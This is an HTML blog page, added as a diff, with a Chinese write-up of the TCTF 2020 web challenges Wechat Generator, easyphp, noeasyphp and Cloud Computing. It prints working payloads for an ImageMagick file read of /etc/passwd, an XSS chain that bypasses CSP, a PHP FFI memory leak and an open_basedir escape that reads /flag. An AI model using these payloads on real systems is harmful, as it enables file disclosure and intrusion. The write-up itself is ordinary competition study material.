@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>tctf2020 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="tctf2020好难.jpg Wechat Generator这题在我们一堆人的群殴下才做出来 题目主要的http请求是：   与 12http:&#x2F;&#x2F;pwnable.org:5000&#x2F;image&#x2F;VMyeGe&#x2F;xxxxxx是后缀，具体列表在：https:&#x2F;&#x2F;imagemagick.org&#x2F;script&#x2F;formats.php      第一部分 ImageMagick读取文件测试share发现，无">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tctf2020">
+<meta property="og:url" content="http://example.com/2021/10/01/tctf2020/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="tctf2020好难.jpg Wechat Generator这题在我们一堆人的群殴下才做出来 题目主要的http请求是：   与 12http:&#x2F;&#x2F;pwnable.org:5000&#x2F;image&#x2F;VMyeGe&#x2F;xxxxxx是后缀，具体列表在：https:&#x2F;&#x2F;imagemagick.org&#x2F;script&#x2F;formats.php      第一部分 ImageMagick读取文件测试share发现，无">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629195954.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200021.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200254.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200643.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200926.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201154.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201349.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629225818.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230827.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230936.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231535.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231806.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231854.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629232130.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000339.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000414.png">
+<meta property="article:published_time" content="2021-10-01T11:06:19.635Z">
+<meta property="article:modified_time" content="2021-10-01T11:06:19.635Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200629195954.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-tctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/10/01/tctf2020/" class="article-date">
+  <time class="dt-published" datetime="2021-10-01T11:06:19.635Z" itemprop="datePublished">2021-10-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      tctf2020
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="tctf2020"><a href="#tctf2020" class="headerlink" title="tctf2020"></a>tctf2020</h1><p>好难.jpg</p>
+<h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><p>这题在我们一堆人的群殴下才做出来</p>
+<p>题目主要的http请求是：</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629195954.png" alt="image130"></p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200021.png" alt="image216"></p>
+<p>与</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://pwnable.org:5000/image/VMyeGe/xxx</span><br><span class="line">xxx是后缀，具体列表在：https://imagemagick.org/script/formats.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="第一部分-ImageMagick读取文件"><a href="#第一部分-ImageMagick读取文件" class="headerlink" title="第一部分 ImageMagick读取文件"></a>第一部分 ImageMagick读取文件</h3><p>测试share发现，无论我们输入的previewid时候存在，都会生成一个短链</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200254.png" alt="image480"></p>
+<p>访问对应的png界面时: <a target="_blank" rel="noopener" href="http://pwnable.org:5000//image/ZpVQfl/png">http://pwnable.org:5000//image/ZpVQfl/png</a> </p>
+<p>返回报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;Convert exception: unable to open image `previews/testting&#x27;: No such file or directory @ error/blob.c/OpenBlob/2874&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据报错猜测是ImageMagick 来转换成对应的后缀</p>
+<p>fuzz后缀后发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pwnable.org:5000/image/FdrpgF/htm</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200643.png" alt="image857"></p>
+<p>根据preview返回的数据，后端估计是先生成一个svg,再转化为其他的格式</p>
+<p>我们再看看他们是如何传递并表示表情的</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200926.png" alt="image1001"></p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201154.png" alt="image1085"></p>
+<p>发现</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201349.png" alt="image1173"></p>
+<p>修改[]里的值可以逃出引号的限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629225818.png" alt="image1437"></p>
+<p>搜索<strong>ImageMagick convert ctf</strong> 发现，ImageMagick convert可以<a target="_blank" rel="noopener" href="https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/">读取文件</a></p>
+<p>构造:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryHJ88AZN7</span><br><span class="line">Content-Disposition: form-data; name=&quot;data&quot;</span><br><span class="line"></span><br><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[\&quot; href=\&quot;text:/etc/passwd\&quot; onerror=\&quot;//]&quot;&#125;]</span><br><span class="line">------WebKitFormBoundaryHJ88AZN7--</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230827.png" alt="image1845"></p>
+<p>测试常见的文件后找到源文件：app.py</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230936.png" alt="image1953"></p>
+<p>这里我们重点关注responseJSON和 secret这两个函数</p>
+<h3 id="第二部分-xss管理员"><a href="#第二部分-xss管理员" class="headerlink" title="第二部分 xss管理员"></a>第二部分 xss管理员</h3><p>secret是让我们xss管理员，但是存在csp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img-src * data:; default-src &#x27;self&#x27;; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; connect-src &#x27;self&#x27;; object-src &#x27;none&#x27;; base-uri &#x27;self&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>responseJSON可以让我们在json数据前加上xxx=,结合报错返回的数据是json格式，如果我们能控制报错信息，我们就能绕过csp</p>
+<p>前文发现 ImageMagick 的那个接口(share)刚好可以控制报错信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">previewid=`test&quot;&#125;,alert(1),&#123;&quot;2&quot;:&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231535.png" alt="image2409"></p>
+<p>接着就是让htm包含它：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;/static/css/bootstrap.min.css\&quot;&gt;&lt;script ssrcrc=\&quot;/static/js/jquery-3.5.1.min.js\&quot;&gt;&lt;/script&gt;&lt;script ssrcrc=\&quot;/static/js/bootstrap.min.js\&quot;&gt;&lt;/script&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231806.png" alt="image2848"></p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231854.png" alt="image2936"></p>
+<h3 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h3><p>一叶飘零大大的wp：</p>
+<p> <a target="_blank" rel="noopener" href="https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator">https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator</a> </p>
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (isset($_GET[&#x27;rh&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;rh&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很简单的源代码,首先查看phpinfo:</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629232130.png" alt="image3265"></p>
+<p>open_basedir: /var/www/html 且该目录不可写，twitter上那个绕过open_basedir的方法就没用了</p>
+<p>利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>列目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin dev etc flag.h flag.so home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br></pre></td></tr></table></figure>
+
+<p>看到flag.h+flag.so+ffi猜测是要用ffi来加载flag.h然后执行其中的方法，</p>
+<p>测试后发现 ffi::load 无视open_basedir ,但是只能加载 /flag.h</p>
+<p>当我们又不知道flag.h中的函数定义。。。。。。</p>
+<p>后来这题是因为别人把题目打穿了，全场绕过open_basedir，读取了flag</p>
+<h2 id="noeasyphp"><a href="#noeasyphp" class="headerlink" title="noeasyphp"></a>noeasyphp</h2><p>这题听说是因为出题人因为easyphp重出的题目</p>
+<p>这里就要直面刚刚明明无法读取flag.h又要了解flag.h中的函数声明</p>
+<p>因为这里有ffi，可以直接操作系统的底层，我们试试内存泄露</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span>=FFI::load(<span class="string">&quot;/flag.h&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>=FFI::cast(<span class="string">&quot;void *&quot;</span>,FFI::new(<span class="string">&quot;int[1]&quot;</span>,<span class="literal">false</span>));</span><br><span class="line"><span class="variable">$a</span>=FFI::string(<span class="variable">$b</span>-<span class="number">400000</span>,<span class="number">400000</span>);</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000339.png" alt="image4044"></p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000414.png" alt="image4128"></p>
+<p>好玩.jpg</p>
+<h2 id="Cloud-Computing"><a href="#Cloud-Computing" class="headerlink" title="Cloud Computing"></a>Cloud Computing</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> mkdir(<span class="string">&#x27;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#x27;</span>);chdir(<span class="string">&#x27;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span>(file_get_contents(<span class="string">&#x27;/flag&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/10/01/tctf2020/" data-id="cku89gxvf0066wvos8l155iqx" data-title="tctf2020" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/10/01/sctf2020/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          sctf2020
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/10/01/tp5rce%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">tp5rce复现</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/10/01/real%20world%20ctf%202020/">real world ctf 2020</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/roarctf2019/">roarctf2019</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/sctf2020/">sctf2020</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/tctf2020/">tctf2020</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/tp5rce%E5%A4%8D%E7%8E%B0/">tp5rce复现</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
